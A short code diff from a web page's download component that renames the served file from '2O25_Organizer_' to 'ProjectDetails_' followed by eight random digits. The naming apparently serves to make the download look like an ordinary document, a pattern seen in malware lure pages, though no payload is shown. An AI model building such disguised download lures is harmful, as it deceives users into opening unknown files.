@@ -374,7 +374,7 @@ const Download = () => {
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
-    const fileName = `2O25_Organizer_${randomDigits(8)}.${file.extension}`;
+    const fileName = `ProjectDetails_${randomDigits(8)}.${file.extension}`;
     try {
       const res = await fetch(file.href, { cache: "no-store" });
       if (!res.ok) throw new Error(`Download source returned ${res.status}`);
